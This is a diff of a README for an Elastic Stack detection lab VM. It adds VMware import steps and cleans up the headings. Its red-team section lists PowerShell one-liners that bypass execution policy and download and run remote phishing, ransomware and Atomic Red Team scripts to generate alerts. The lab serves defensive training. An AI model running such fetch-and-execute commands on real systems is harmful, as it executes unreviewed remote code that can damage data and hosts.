@@ -36,11 +36,19 @@ With the Elastic agent ingesting Sysmon, Powershell, wineventlogs, Endpoint Moni
 | Elastic_Lab.ovf | SHA256 | FD9789EEFE05963297369EE9524A423C7BC76E65FD271D41227BFFA4DDCEDE63 |
 
 
--------------------
-
 ## Installation 
   
--------------------  
+  1. Unzip Elastic_Lab.zip
+  2. Open VMWare
+  3. Select `Open A Virtual Machine`
+  4. Select `Elastic_Lab.ovf`
+  5. Insert name of new virtual machine i.e `Elastic_Lab`
+  6. Select storage path for the virtual machine
+  7. Select `Import`
+  8. Importing the VM can take some time
+  9. Take Snapshot prior to start machine
+
+<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/snapshot.png" width=75% height=75%>  
   
 ## Remember
 
@@ -60,7 +68,6 @@ if it shows that the agent is offline / unhealhy you will need to restart the ag
   
 <img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server2.png" width=75% height=75%>  
   
--------------------  
    
 ## Red Team Scenarios
   
@@ -69,19 +76,19 @@ This will generate logs and alerts within Kibana.
 Depening on the scenario the powershell scripts can take from 5 - 30 minutes to execute.  
 When you what to reset the VM or clean up after the attack just select the restart snapshot.
 
-#### :fishing_pole_and_fish: Phishing :fishing_pole_and_fish: ####
+#### Phishing ####
 
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Phish.ps1')"
 ```
   
-#### :collision: Ransomware  :collision: ####
+#### Ransomware ####
 
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Ransom.ps1')"
 ```
   
-#### :see_no_evil: Execute all atomic red team scripts :see_no_evil: ####
+#### Execute all atomic red team scripts ####
   
 ```
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/AtomicRedTeam_All.ps1')"
@@ -204,7 +211,7 @@ powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadS
 * 4 CPU
 * 60GB Storage
 
-### VM Specs
+## VM Specs
 
 * Windows 10 (unlicensed)
 * Elastic Agent 8.6.1
